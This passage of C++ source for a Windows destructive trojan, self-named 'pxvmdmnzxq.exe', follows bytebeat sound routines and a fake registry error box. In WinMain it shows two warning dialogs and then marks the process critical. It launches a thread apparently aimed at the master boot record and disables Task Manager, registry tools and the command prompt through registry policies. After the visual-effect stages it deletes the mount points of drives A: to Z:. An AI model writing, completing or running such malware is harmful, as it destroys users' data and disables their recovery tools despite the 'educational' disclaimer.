	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound3() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[11025 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t * t ^ (t & t >> 6));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound4() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 22050, 22050, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[22050 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t * (t >> 1 | t >> 5) & 1000 & t >> 6 ^ (t | t >> 1 | t * t >> 9));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound5() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 22050, 22050, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[22050 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		if (t != 0) buffer[t] = static_cast<char>(t * (t >> 2 | t >> 5) & 150 & t >> 6 ^ (t | t >> 1 | t * t >> 9));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound6() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 22050, 22050, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[22050 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		if (t != 0) buffer[t] = static_cast<char>(t * (t >> 2 | t >> 4) & 150 & t >> 9 ^ (t | t >> 1 | t * t >> 9));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound7() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 22050, 22050, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[22050 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		if (t != 0) buffer[t] = static_cast<char>(t * (t >> 9 | t >> 2) & 150 & t >> 9 ^ (t | t >> 1 | t * t >> 9));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound8() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 22050, 22050, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[22050 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		if (t != 0) buffer[t] = static_cast<char>(t * (t >> 5 | t >> 2) & 150 & t >> 9 ^ (t * t >> 1 | t & t >> 4));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound9() { //credits to N17Pro3426, but it's 11025 instead of 8000
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[11025 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		if (t != 0) buffer[t] = static_cast<char>((t * 1 | t >> 2 | t >> 6) * 30 & (t * 7 << -1 | t >> -2 | t >> 11) * 4);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
DWORD WINAPI fakeerror(LPVOID lpParam) {
	MessageBox(NULL, L"The system has reached the maximum size allowed for the system part of the registry. Additional storage requests will be ignored.", L"Windows - Low On Registry Space", MB_ICONERROR);
	return 0;
}
int CALLBACK WinMain(
	HINSTANCE hInstance, HINSTANCE hPrevInstance,
	LPSTR     lpCmdLine, int       nCmdShow
)
{
	if (MessageBoxW(NULL, L"Warning! You have ran a trojan known as pxvmdmnzxq.exe that has full capacity to delete all of your data and your operating system. By continuing, you keep in mind that the creator will not be responsible for any damage caused by this trojan and it's highly recommended that you run this in a testing virtual machine where a snapshot has been made before execution for the sake of entertainment and analysis. Are you sure you want to run this?", L"pxvmdmnzxq.exe (no skid)", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
	{
		ExitProcess(0);
	}
	else
	{
		if (MessageBoxW(NULL, L"Final warning! This trojan has a lot of destructive potential. You will lose all of your data if you continue and the creator (Underwater Tiny Kong & WindowsTrojan Studios/WindowsTrojan122) will not be responsible for any of the damage caused. This is not meant to be malicious, but simply for entertainment and educational purposes. Are you sure you want to continue? This is your final chance to stop this program from execution.", L"pxvmdmnzxq.exe (no skid)", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
		{
			ExitProcess(0);
		}
		else
		{
			ProcessIsCritical();
			CreateThread(0, 0, mbr, 0, 0, 0);
			RegAdd(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", L"DisableTaskMgr", REG_DWORD, 1);
			RegAdd(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", L"DisableRegistryTools", REG_DWORD, 1);
			RegAdd(HKEY_CURRENT_USER, L"SOFTWARE\\Policies\\Microsoft\\Windows\\System", L"DisableCMD", REG_DWORD, 2);
			MessageBoxW(NULL, L"Melt time", L"eh", MB_OK | MB_ICONEXCLAMATION);
			Sleep(1000);
			HANDLE thread1 = CreateThread(0, 0, noskid1, 0, 0, 0);
			sound1();
			Sleep(30000);
			TerminateThread(thread1, 0);
			CloseHandle(thread1);
			InvalidateRect(0, 0, 0);
			HANDLE thread2 = CreateThread(0, 0, noskid2, 0, 0, 0);
			sound2();
			Sleep(30000);
			TerminateThread(thread2, 0);
			CloseHandle(thread2);
			InvalidateRect(0, 0, 0);
			HANDLE thread3 = CreateThread(0, 0, noskid3, 0, 0, 0);
			HANDLE thread3dot1 = CreateThread(0, 0, noskid31, 0, 0, 0);
			sound3();
			Sleep(30000);
			TerminateThread(thread3, 0);
			CloseHandle(thread3);
			TerminateThread(thread3dot1, 0);
			CloseHandle(thread3dot1);
			InvalidateRect(0, 0, 0);
			HANDLE thread4 = CreateThread(0, 0, noskid4, 0, 0, 0);
			sound4();
			Sleep(30000);
			TerminateThread(thread4, 0);
			CloseHandle(thread4);
			InvalidateRect(0, 0, 0);
			HANDLE thread5 = CreateThread(0, 0, noskid5, 0, 0, 0);
			sound5();
			Sleep(30000);
			TerminateThread(thread5, 0);
			CloseHandle(thread5);
			InvalidateRect(0, 0, 0);
			HANDLE thread6 = CreateThread(0, 0, noskid6, 0, 0, 0);
			HANDLE thread6dot1 = CreateThread(0, 0, noskid61, 0, 0, 0);
			sound6();
			Sleep(30000);
			TerminateThread(thread6, 0);
			CloseHandle(thread6);
			TerminateThread(thread6dot1, 0);
			CloseHandle(thread6dot1);
			InvalidateRect(0, 0, 0);
			HANDLE thread7 = CreateThread(0, 0, noskid7, 0, 0, 0);
			sound7();
			Sleep(30000);
			TerminateThread(thread7, 0);
			CloseHandle(thread7);
			InvalidateRect(0, 0, 0);
			HANDLE thread8 = CreateThread(0, 0, noskid8, 0, 0, 0);
			sound8();
			Sleep(30000);
			TerminateThread(thread8, 0);
			CloseHandle(thread8);
			InvalidateRect(0, 0, 0);
			HANDLE thread9 = CreateThread(0, 0, noskid9, 0, 0, 0);
			sound9();
			Sleep(30000);
			TerminateThread(thread9, 0);
			CloseHandle(thread9);
			InvalidateRect(0, 0, 0);
			Sleep(1000);
			HANDLE threadlast = CreateThread(0, 0, windowdrop, 0, 0, 0);
			Sleep(29000);
			TerminateThread(threadlast, 0);
			CloseHandle(threadlast);
			DeleteVolumeMountPointA("A:\\");
			DeleteVolumeMountPointA("B:\\");
			DeleteVolumeMountPointA("C:\\");
			DeleteVolumeMountPointA("D:\\");
			DeleteVolumeMountPointA("E:\\");
			DeleteVolumeMountPointA("F:\\");
			DeleteVolumeMountPointA("G:\\");
			DeleteVolumeMountPointA("H:\\");
			DeleteVolumeMountPointA("I:\\");
			DeleteVolumeMountPointA("J:\\");
			DeleteVolumeMountPointA("K:\\");
			DeleteVolumeMountPointA("L:\\");
			DeleteVolumeMountPointA("M:\\");
			DeleteVolumeMountPointA("N:\\");
			DeleteVolumeMountPointA("O:\\");
			DeleteVolumeMountPointA("P:\\");
			DeleteVolumeMountPointA("Q:\\");
			DeleteVolumeMountPointA("R:\\");
			DeleteVolumeMountPointA("S:\\");
			DeleteVolumeMountPointA("T:\\");
			DeleteVolumeMountPointA("U:\\");
			DeleteVolumeMountPointA("V:\\");
			DeleteVolumeMountPointA("W:\\");
			DeleteVolumeMountPointA("X:\\");
			DeleteVolumeMountPointA("Y:\\");
			DeleteVolumeMountPointA("Z:\\");
			Sleep(-1);
		}
	}
}